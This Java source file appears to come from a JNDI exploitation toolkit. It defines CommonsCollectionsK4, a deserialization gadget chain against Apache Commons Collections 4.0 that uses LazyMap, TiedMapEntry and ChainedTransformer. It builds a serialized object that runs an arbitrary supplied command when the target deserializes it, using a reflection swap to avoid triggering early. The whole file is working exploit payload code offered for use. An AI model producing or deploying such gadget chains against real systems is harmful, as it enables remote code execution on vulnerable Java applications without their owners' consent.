package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;
@Dependencies({"commons-collections:commons-collections:4.0"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollectionsK4 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        String        command          = param[0];
        Transformer[] fakeTransformers = new Transformer[]{(Transformer) new ConstantTransformer(1)};
        Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
        Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
        Map           innerMap         = new HashMap();
        Map           outerMap         = LazyMap.lazyMap(innerMap, transformerChain);
        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "nu1r");
        Map           expMap           = new HashMap();
        expMap.put(tme, "nu1r");
        outerMap.remove("nu1r");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return expMap;
    }
}
